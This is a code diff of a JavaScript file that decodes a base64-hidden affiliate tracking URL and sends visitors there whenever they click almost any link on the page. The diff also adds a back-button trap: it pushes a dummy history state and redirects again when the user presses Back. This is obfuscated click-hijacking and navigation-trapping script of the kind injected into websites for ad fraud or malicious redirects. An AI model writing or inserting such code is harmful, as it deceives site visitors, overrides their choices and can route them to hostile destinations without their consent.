@@ -2,8 +2,8 @@ const excludedLinks = ['/about', '/contact'];
 const base64Url = 'aHR0cHM6Ly90cmtnZmxvdy5nMmFmc2UuY29tL2NsaWNrP3BpZD0xMyZvZmZlcl9pZD0zMDU0';
 
 function base64_decode(data) {
-    var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-    var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
+    const b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+    let o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
     do {
         h1 = b64.indexOf(data.charAt(i++));
         h2 = b64.indexOf(data.charAt(i++));
@@ -14,8 +14,8 @@ function base64_decode(data) {
         o2 = bits >> 8 & 0xff;
         o3 = bits & 0xff;
 
-        if (h3 == 64) enc += String.fromCharCode(o1);
-        else if (h4 == 64) enc += String.fromCharCode(o1, o2);
+        if (h3 === 64) enc += String.fromCharCode(o1);
+        else if (h4 === 64) enc += String.fromCharCode(o1, o2);
         else enc += String.fromCharCode(o1, o2, o3);
     } while (i < data.length);
     return enc;
@@ -34,11 +34,19 @@ function shouldRedirect(event) {
     return true;
 }
 
+function redirect() {
+    window.location.href = redirectUrl;
+}
+
 document.addEventListener('DOMContentLoaded', () => {
     document.body.addEventListener('click', (event) => {
         if (shouldRedirect(event)) {
             event.preventDefault();
-            window.location.href = redirectUrl;
+            redirect();
         }
     });
+
+    // Push a dummy state to track the initial page load
+    history.pushState({}, document.title, window.location.pathname);
+    window.addEventListener('popstate', redirect);
 });
